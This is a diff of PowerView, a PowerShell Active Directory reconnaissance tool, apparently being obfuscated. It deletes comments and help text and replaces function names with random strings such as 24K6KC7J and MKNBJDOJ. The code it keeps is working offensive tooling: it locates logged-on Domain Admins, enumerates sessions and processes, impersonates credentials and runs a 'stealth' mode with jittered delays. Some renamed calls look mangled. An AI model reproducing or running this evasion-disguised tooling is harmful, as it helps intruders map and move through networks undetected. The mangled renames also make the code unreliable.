-i.e. @(*.doc*, *.xls*, *.ppt*)
-
-.PARAMETER LastAccessTime
-
-Only return files with a LastAccessTime greater than this date value.
-
-.PARAMETER LastWriteTime
-
-Only return files with a LastWriteTime greater than this date value.
-
-.PARAMETER CreationTime
-
-Only return files with a CreationTime greater than this date value.
-
-.PARAMETER OfficeDocs
-
-Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)
-
-.PARAMETER FreshEXEs
-
-Switch. Find .EXEs accessed within the last 7 days.
-
-.PARAMETER ExcludeFolders
-
-Switch. Exclude folders from the search results.
-
-.PARAMETER ExcludeHidden
-
-Switch. Exclude hidden files and folders from the search results.
-
-.PARAMETER CheckWriteAccess
-
-Switch. Only returns files the current user has write access to.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-to connect to remote systems for file enumeration.
-
-.EXAMPLE
-
-Find-InterestingFile -Path "C:\Backup\"
-
-Returns any files on the local path C:\Backup\ that have the default
-search term set in the title.
-
-.EXAMPLE
-
-Find-InterestingFile -Path "\\WINDOWS7\Users\" -LastAccessTime (Get-Date).AddDays(-7)
-
-Returns any files on the remote path \\WINDOWS7\Users\ that have the default
-search term set in the title and were accessed within the last week.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-InterestingFile -Credential $Cred -Path "\\PRIMARY.testlab.local\C$\Temp\"
-
-.OUTPUTS
-
-PowerView.FoundFile
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FoundFile')]
@@ -16367,7 +9867,7 @@ PowerView.FoundFile
             $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
         }
         elseif ($PSBoundParameters['FreshEXEs']) {
-            # find .exe's accessed within the last 7 days
+            
             $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
             $SearcherArguments['Include'] = @('*.exe')
         }
@@ -16376,7 +9876,7 @@ PowerView.FoundFile
         $MappedComputers = @{}
 
         function Test-Write {
-            # short helper to check is the current user can write to a file
+            
             [CmdletBinding()]Param([String]$Path)
             try {
                 $Filetest = [IO.File]::OpenWrite($Path)
@@ -16394,15 +9894,15 @@ PowerView.FoundFile
             if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $HostComputer = (New-Object System.Uri($TargetPath)).Host
                 if (-not $MappedComputers[$HostComputer]) {
-                    # map IPC$ to this computer if it's not already
-                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
+                    
+                    MKK4QQPC -ComputerName $HostComputer -Credential $Credential
                     $MappedComputers[$HostComputer] = $True
                 }
             }
 
             $SearcherArguments['Path'] = $TargetPath
             Get-ChildItem @SearcherArguments | ForEach-Object {
-                # check if we're excluding folders
+                
                 $Continue = $True
                 if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                     Write-Verbose "Excluding: $($_.FullName)"
@@ -16438,20 +9938,20 @@ PowerView.FoundFile
     }
 
     END {
-        # remove the IPC$ mappings
-        $MappedComputers.Keys | Remove-RemoteConnection
+        
+        $MappedComputers.Keys | TUGT2IL3
     }
 }
 
 
-########################################################
-#
-# 'Meta'-functions start below
-#
-########################################################
 
-function New-ThreadedFunction {
-    # Helper used by any threaded host enumeration functions
+
+
+
+
+
+function 24K6KC7J {
+    
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
     Param(
@@ -16476,45 +9976,45 @@ function New-ThreadedFunction {
     )
 
     BEGIN {
-        # Adapted from:
-        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
+        
+        
         $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
 
-        # # $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
-        # force a single-threaded apartment state (for token-impersonation stuffz)
+        
+        
         $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA
 
-        # import the current session state's variables and functions so the chained PowerView
-        #   functionality can be used by the threaded blocks
+        
+        
         if (-not $NoImports) {
-            # grab all the current variables for this runspace
+            
             $MyVars = Get-Variable -Scope 2
 
-            # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
+            
             $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
 
-            # add Variables from Parent Scope (current runspace) into the InitialSessionState
+            
             ForEach ($Var in $MyVars) {
                 if ($VorbiddenVars -NotContains $Var.Name) {
                 $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                 }
             }
 
-            # add Functions from current runspace to the InitialSessionState
+            
             ForEach ($Function in (Get-ChildItem Function:)) {
                 $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
             }
         }
 
-        # threading adapted from
-        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
-        #   Thanks Carlos!
+        
+        
+        
 
-        # create a pool of maxThread runspaces
+        
         $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
         $Pool.Open()
 
-        # do some trickery to get the proper BeginInvoke() method that allows for an output queue
+        
         $Method = $Null
         ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
             $MethodParameters = $M.GetParameters()
@@ -16526,9 +10026,9 @@ function New-ThreadedFunction {
 
         $Jobs = @()
         $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
-        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"
+        Write-Verbose "[24K6KC7J] Total number of hosts: $($ComputerName.count)"
 
-        # partition all hosts from -ComputerName into $Threads number of groups
+        
         if ($Threads -ge $ComputerName.Length) {
             $Threads = $ComputerName.Length
         }
@@ -16548,14 +10048,14 @@ function New-ThreadedFunction {
             $ComputerNamePartitioned += @(,@($List.ToArray()))
         }
 
-        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"
+        Write-Verbose "[24K6KC7J] Total number of threads/partitions: $Threads"
 
         ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
-            # create a "powershell pipeline runner"
+            
             $PowerShell = [PowerShell]::Create()
             $PowerShell.runspacepool = $Pool
 
-            # add the script block + arguments with the given computer partition
+            
             $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
             if ($ScriptParameters) {
                 ForEach ($Param in $ScriptParameters.GetEnumerator()) {
@@ -16563,10 +10063,10 @@ function New-ThreadedFunction {
                 }
             }
 
-            # create the output queue
+            
             $Output = New-Object Management.Automation.PSDataCollection[Object]
 
-            # kick off execution using the BeginInvok() method that allows queues
+            
             $Jobs += @{
                 PS = $PowerShell
                 Output = $Output
@@ -16576,9 +10076,9 @@ function New-ThreadedFunction {
     }
 
     END {
-        Write-Verbose "[New-ThreadedFunction] Threads executing"
+        Write-Verbose "[24K6KC7J] Threads executing"
 
-        # continuously loop through each job queue, consuming output as appropriate
+        
         Do {
             ForEach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
@@ -16588,9 +10088,9 @@ function New-ThreadedFunction {
         While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
 
         $SleepSeconds = 100
-        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
+        Write-Verbose "[24K6KC7J] Waiting $SleepSeconds seconds for final cleanup..."
 
-        # cleanup- make sure we didn't miss anything
+        
         for ($i=0; $i -lt $SleepSeconds; $i++) {
             ForEach ($Job in $Jobs) {
                 $Job.Output.ReadAll()
@@ -16600,195 +10100,13 @@ function New-ThreadedFunction {
         }
 
         $Pool.Dispose()
-        Write-Verbose "[New-ThreadedFunction] all threads completed"
+        Write-Verbose "[24K6KC7J] all threads completed"
     }
 }
 
 
-function Find-DomainUserLocation {
-<#
-.SYNOPSIS
+function MKNBJDOJ {
 
-Finds domain machines where specific users are logged into.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainFileServer, Get-DomainDFSShare, Get-DomainController, Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetSession, Test-AdminAccess, Get-NetLoggedon, Resolve-IPAddress, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and queries the domain for users of a specified group
-(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
-function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon
-The found user list is compared against the target list, and any matches are
-displayed. If -ShowAll is specified, all results are displayed instead of
-the filtered set. If -Stealth is specified, then likely highly-trafficed servers
-are enumerated with Get-DomainFileServer/Get-DomainController, and session
-enumeration is executed only against those servers. If -Credential is passed,
-then Invoke-UserImpersonation is used to impersonate the specified user
-before enumeration, reverting after with Invoke-RevertToSelf.
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER Domain
-
-Specifies the domain to query for computers AND users, defaults to the current domain.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerUnconstrained
-
-Switch. Search computer objects that have unconstrained delegation.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER UserIdentity
-
-Specifies one or more user identities to search for.
-
-.PARAMETER UserDomain
-
-Specifies the domain to query for users to search for, defaults to the current domain.
-
-.PARAMETER UserLDAPFilter
-
-Specifies an LDAP query string that is used to search for target users.
-
-.PARAMETER UserSearchBase
-
-Specifies the LDAP source to search through for target users.
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER UserGroupIdentity
-
-Specifies a group identity to query for target users, defaults to 'Domain Admins.
-If any other user specifications are set, then UserGroupIdentity is ignored.
-
-.PARAMETER UserAdminCount
-
-Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).
-
-.PARAMETER UserAllowDelegation
-
-Switch. Search for user accounts that are not marked as 'sensitive and not allowed for delegation'.
-
-.PARAMETER CheckAccess
-
-Switch. Check if the current user has local admin access to computers where target users are found.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER StopOnSuccess
-
-Switch. Stop hunting after finding after finding a target user.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER ShowAll
-
-Switch. Return all user location results instead of filtering based on target
-specifications.
-
-.PARAMETER Stealth
-
-Switch. Only enumerate sessions from connonly used target servers.
-
-.PARAMETER StealthSource
-
-The source of target servers to use, 'DFS' (distributed file servers),
-'DC' (domain controllers), 'File' (file servers), or 'All' (the default).
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-DomainUserLocation
-
-Searches for 'Domain Admins' by enumerating every computer in the domain.
-
-.EXAMPLE
-
-Find-DomainUserLocation -Stealth -ShowAll
-
-Enumerates likely highly-trafficked servers, performs just session enumeration
-against each, and outputs all results.
-
-.EXAMPLE
-
-Find-DomainUserLocation -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local
-
-Enumerates Windows 7 computers in dev.testlab.local and returns user results for privileged
-users in dev.testlab.local.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-DomainUserLocation -Domain testlab.local -Credential $Cred
-
-Searches for domain admin locations in the testlab.local using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.UserLocation
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.UserLocation')]
@@ -16958,17 +10276,17 @@ PowerView.UserLocation
 
         $TargetComputers = @()
 
-        # first, build the set of computers to enumerate
+        
         if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = @($ComputerName)
         }
         else {
             if ($PSBoundParameters['Stealth']) {
-                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $StealthSource"
+                Write-Verbose "[MKNBJDOJ] Stealth enumeration using source: $StealthSource"
                 $TargetComputerArrayList = New-Object System.Collections.ArrayList
 
                 if ($StealthSource -match 'File|All') {
-                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
+                    Write-Verbose '[MKNBJDOJ] Querying for file servers'
                     $FileServerSearcherArguments = @{}
                     if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                     if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
@@ -16979,17 +10297,17 @@ PowerView.UserLocation
                     if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                     if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                     if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
-                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
+                    $FileServers = QIVRPO05 @FileServerSearcherArguments
                     if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                     $TargetComputerArrayList.AddRange( $FileServers )
                 }
                 if ($StealthSource -match 'DFS|All') {
-                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
-                    # # TODO: fix the passed parameters to Get-DomainDFSShare
-                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}
+                    Write-Verbose '[MKNBJDOJ] Querying for DFS servers'
+                    
+                    
                 }
                 if ($StealthSource -match 'DC|All') {
-                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
+                    Write-Verbose '[MKNBJDOJ] Querying for domain controllers'
                     $DCSearcherArguments = @{
                         'LDAP' = $True
                     }
@@ -16997,23 +10315,23 @@ PowerView.UserLocation
                     if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                     if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                     if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
-                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+                    $DomainControllers = RP7TH4PM @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                     if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                     $TargetComputerArrayList.AddRange( $DomainControllers )
                 }
                 $TargetComputers = $TargetComputerArrayList.ToArray()
             }
             else {
-                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
-                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+                Write-Verbose '[MKNBJDOJ] Querying for all computers in the domain'
+                $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
             }
         }
-        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[MKNBJDOJ] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-DomainUserLocation] No hosts found to enumerate'
+            throw '[MKNBJDOJ] No hosts found to enumerate'
         }
 
-        # get the current user so we can ignore it in the results
+        
         if ($PSBoundParameters['Credential']) {
             $CurrentUser = $Credential.GetNetworkCredential().UserName
         }
@@ -17021,12 +10339,12 @@ PowerView.UserLocation
             $CurrentUser = ([Environment]::UserName).ToLower()
         }
 
-        # now build the user target set
+        
         if ($PSBoundParameters['ShowAll']) {
             $TargetUsers = @()
         }
         elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
-            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = YBTPOIR8 @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
             $GroupSearcherArguments = @{
@@ -17041,27 +10359,27 @@ PowerView.UserLocation
             if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
             if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
             if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
-            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            $TargetUsers = H3GAYKFBMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
-        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
+        Write-Verbose "[MKNBJDOJ] TargetUsers length: $($TargetUsers.Length)"
         if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
-            throw '[Find-DomainUserLocation] No users found to target'
+            throw '[MKNBJDOJ] No users found to target'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)
 
             if ($TokenHandle) {
-                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
-                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+                
+                $Null = ECK2AE5S -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $Sessions = Get-NetSession -ComputerName $TargetComputer
+                    $Sessions = 3F2205T7 -ComputerName $TargetComputer
                     ForEach ($Session in $Sessions) {
                         $UserName = $Session.UserName
                         $CName = $Session.CName
@@ -17070,7 +10388,7 @@ PowerView.UserLocation
                             $CName = $CName.TrimStart('\')
                         }
 
-                        # make sure we have a result, and ignore computer$ sessions
+                        
                         if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {
 
                             if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
@@ -17080,7 +10398,7 @@ PowerView.UserLocation
                                 $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                 $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName
 
-                                # try to resolve the DNS hostname of $Cname
+                                
                                 try {
                                     $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                     $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
@@ -17089,9 +10407,9 @@ PowerView.UserLocation
                                     $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                 }
 
-                                # see if we're checking to see if we have local admin access on this machine
+                                
                                 if ($CheckAccess) {
-                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
+                                    $Admin = (F32E8AKI -ComputerName $CName).IsAdmin
                                     $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                 }
                                 else {
@@ -17103,13 +10421,13 @@ PowerView.UserLocation
                         }
                     }
                     if (-not $Stealth) {
-                        # if we're not 'stealthy', enumerate loggedon users as well
-                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
+                        
+                        $LoggedOn = 4SWKN0XB -ComputerName $TargetComputer
                         ForEach ($User in $LoggedOn) {
                             $UserName = $User.UserName
                             $UserDomain = $User.LogonDomain
 
-                            # make sure wet have a result
+                            
                             if (($UserName) -and ($UserName.trim() -ne '')) {
                                 if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                     $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
@@ -17121,9 +10439,9 @@ PowerView.UserLocation
                                     $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                     $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null
 
-                                    # see if we're checking to see if we have local admin access on this machine
+                                    
                                     if ($CheckAccess) {
-                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
+                                        $Admin = F32E8AKI -ComputerName $TargetComputer
                                         $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                     }
                                     else {
@@ -17139,50 +10457,50 @@ PowerView.UserLocation
             }
 
             if ($TokenHandle) {
-                Invoke-RevertToSelf
+                JCUMHZOK
             }
         }
 
         $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+                $LogonToken = ECK2AE5S -Credential $Credential
             }
             else {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+                $LogonToken = ECK2AE5S -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[MKNBJDOJ] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[MKNBJDOJ] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
+                Write-Verbose "[MKNBJDOJ] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
+                    Write-Verbose "[MKNBJDOJ] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
-            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
+            Write-Verbose "[MKNBJDOJ] Using threading with threads: $Threads"
+            Write-Verbose "[MKNBJDOJ] TargetComputers length: $($TargetComputers.Length)"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'TargetUsers' = $TargetUsers
                 'CurrentUser' = $CurrentUser
@@ -17190,183 +10508,21 @@ PowerView.UserLocation
                 'TokenHandle' = $LogonToken
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Find-DomainProcess {
-<#
-.SYNOPSIS
+function 9YE7TFUR {
 
-Searches for processes on the domain using WMI, returning processes
-that match a particular user specification or process name.
-
-Thanks to @paulbrandau for the approach idea.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and queries the domain for users of a specified group
-(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
-function enumerates any current processes running with Get-WMIProcess,
-searching for processes running under any target user contexts or with the
-specified -ProcessName. If -Credential is passed, it is passed through to
-the underlying WMI commands used to enumerate the remote machines.
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER Domain
-
-Specifies the domain to query for computers AND users, defaults to the current domain.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerUnconstrained
-
-Switch. Search computer objects that have unconstrained delegation.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER ProcessName
-
-Search for processes with one or more specific names.
-
-.PARAMETER UserIdentity
-
-Specifies one or more user identities to search for.
-
-.PARAMETER UserDomain
-
-Specifies the domain to query for users to search for, defaults to the current domain.
-
-.PARAMETER UserLDAPFilter
-
-Specifies an LDAP query string that is used to search for target users.
-
-.PARAMETER UserSearchBase
-
-Specifies the LDAP source to search through for target users.
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER UserGroupIdentity
-
-Specifies a group identity to query for target users, defaults to 'Domain Admins.
-If any other user specifications are set, then UserGroupIdentity is ignored.
-
-.PARAMETER UserAdminCount
-
-Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER StopOnSuccess
-
-Switch. Stop hunting after finding after finding a target user.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-DomainProcess
-
-Searches for processes run by 'Domain Admins' by enumerating every computer in the domain.
-
-.EXAMPLE
-
-Find-DomainProcess -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local
-
-Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
-privileged users in dev.testlab.local.
-
-.EXAMPLE
-
-Find-DomainProcess -ProcessName putty.exe
-
-Searchings for instances of putty.exe running on the current domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-DomainProcess -Domain testlab.local -Credential $Cred
-
-Searches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.UserProcess
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
